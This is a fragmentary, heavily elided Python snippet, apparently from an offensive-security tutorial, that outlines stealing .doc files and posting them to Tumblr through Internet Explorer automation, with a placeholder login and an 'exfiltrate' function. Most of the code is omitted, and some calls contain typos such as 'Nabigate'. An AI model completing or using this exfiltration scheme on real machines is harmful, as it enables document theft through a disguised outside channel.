...
doc_type = ".doc"
username = "username"   # Tumblr username and password
password = "password"
...
def login_to_tumblr(ie):
    ...
    # you can be presented with differnet homepages
    try:
...
def exfiltrate(document_path):
    ...
    ie.Nabigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)
...
# main loop for document discovery. note: no tab for first line of code below
